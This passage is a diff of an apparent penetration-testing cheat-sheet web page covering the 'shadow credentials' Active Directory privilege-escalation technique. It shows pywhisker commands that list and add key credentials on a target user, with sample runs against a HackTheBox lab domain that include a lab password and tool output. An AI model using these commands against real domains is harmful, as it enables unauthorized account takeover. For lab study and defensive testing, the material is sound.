@@ -328,18 +328,18 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="privesc-1-shadow-credentials">Privesc #1: Shadow credentials</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Linux</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-pre-check-optional">0. Pre-check [optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py --action list -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --dc-ip &lt;DC&gt; -t &#39;&lt;TARGET_USER&gt;&#39; --use-ldaps
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py -t &#39;&lt;TARGET_USER&gt;&#39; --action list -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --dc-ip &lt;DC_IP&gt; --use-ldaps
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 pywhisker.py --action list -d outdated.htb -u <span class="s1">&#39;btables&#39;</span> -p <span class="s1">&#39;5myBPLPDKT3Bfq&#39;</span> --dc-ip 10.10.11.175 -t <span class="s1">&#39;sflowers&#39;</span> --use-ldaps
 </span></span><span class="line"><span class="cl"><span class="go">[*] Searching for the target account
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
 </span></span></span></code></pre></div><h4 id="1-add-shadow-credentials">1. Add shadow credentials</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py --action add -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --dc-ip &lt;DC&gt; -t &#39;&lt;TARGET_USER&gt;&#39; --use-ldaps
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py --action add -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --dc-ip &lt;DC_IP&gt; -t &#39;&lt;TARGET_USER&gt;&#39; --use-ldaps
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 pywhisker.py --action add -d outdated.htb -u <span class="s1">&#39;btables&#39;</span> -p <span class="s1">&#39;5myBPLPDKT3Bfq&#39;</span> --dc-ip 10.10.11.175 -t <span class="s1">&#39;sflowers&#39;</span> --use-ldaps
 </span></span><span class="line"><span class="cl"><span class="go">[*] Searching for the target account
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
